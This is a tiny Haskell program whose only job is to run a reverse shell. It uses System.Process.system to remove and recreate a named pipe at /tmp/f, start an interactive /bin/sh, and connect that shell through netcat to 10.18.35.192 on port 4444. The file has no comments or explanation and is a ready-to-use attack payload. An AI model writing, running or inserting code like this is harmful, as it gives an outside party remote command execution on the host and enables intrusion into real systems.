import System.Process

main :: IO ()
main = do
  _ <- system "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.35.192 4444 >/tmp/f "
  return ()
